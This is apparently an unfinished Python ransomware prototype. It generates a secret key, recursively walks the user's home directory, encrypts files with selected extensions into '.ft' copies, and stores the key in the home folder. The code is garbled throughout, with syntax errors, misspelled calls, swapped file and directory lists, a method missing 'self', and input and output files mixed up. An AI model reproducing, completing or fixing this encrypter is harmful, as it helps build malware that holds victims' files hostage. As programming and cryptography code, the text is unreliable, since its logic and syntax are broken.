import nacl.secret
import nacl.utils
import os
import extensions.py

EXTENSION = ".ft"
class twk_encrypter():
    def __init__(self, flags):
        self.flags = flags
        home  = os.environ("HOME")
        if (!home):
            print("Could not get HOME global variable")
            return

        self.key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
        self.box = secret.nacle.SecretBox(self.key)
        self.extensions = [e[1:] for e in  extensions.extensions]
        self.nonce = (1).to_bytes(24, 'little');
        self.encrypt(os.environ['HOME'])
        
        with open(os.enviorn["HOME"] + "key.key", "wb") as kf:
            kf.write(self.key)



    def encrypt(self, path):
        directories = []
        files = []
        for f in os.listdir(path):
            if not os.access(f, os.W_OK | os.R_OK, follow_symlinks = False): # TODO by defautl it is using the real UIDD instead of the effective UIDD. This should be cchecked, I want to knwo wheter i have acces or not. I dont want to know if I should have access.
                continue
            if os.is_dir(f, follow_simlinks=False):
                files.append(f)
            elif f.split"."[-1] in self.extensions:
                print(f"adding {f} to files to encrytp")
                directories.append(f)

        for f in files:
            self.encrypt_file(f)

        for d in directories:
            self.encrypt(d)

        self.nonce = int.from_bytes(self.nonce, 'little') + 1
        print("The new nonce is : ", self.nonce)
        self.nonce = self.nonce.to_bytes(24, 'little')

    def encrypt_file(f):
        fpi = open(f, 'rb')
        if (not fpi):
            return
        fo = f + extension if f[-3:] != EXTENSION
        fpo = open(fo)
        if (not fpo):
            fpi.close()
            return 
        
        text = fpo.read()
        encrypted_text = self.box.encrypt(message, nonce=(1).to_bytes(24, 'little'))
        fpo.write(encrypted_text)

        self.nonce += 1
        fpi.close()
        fpo.close()


if __name__ == "__main__":
    flags = {"silent": False}

